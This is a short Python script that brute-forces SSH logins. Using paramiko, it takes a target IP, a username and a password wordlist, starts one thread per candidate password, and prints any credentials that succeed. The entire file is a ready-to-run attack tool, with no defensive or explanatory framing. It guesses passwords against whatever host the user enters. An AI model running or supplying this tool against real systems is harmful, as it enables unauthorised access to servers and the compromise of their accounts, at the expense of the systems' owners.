import threading
import time
import paramiko, os, sys, termcolor
from threading import *

stop_flag = 0


def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=hostname, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(f'Success! with username {username} and password {password}', 'green'))
        sys.exit()

    except:
        print(termcolor.colored(f'[-] Authentication Failed with username {username} and password {password} ', 'red'))
    ssh.close()


username = input('[*] Enter the username of the machine that you want to connect: ')
hostname = input('[*] Enter the ip address of the target: ')
password = input('[*] Enter the path of the password file: ')
print('\n')

if os.path.exists(password):
    print('[+] Loaded')
else:
    sys.exit('[-] No file with that name! Exiting...................')

print('* * * Starting Threaded SSH Bruteforce')

with open(password) as f:
    for line in f.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)

print('Not found')


















































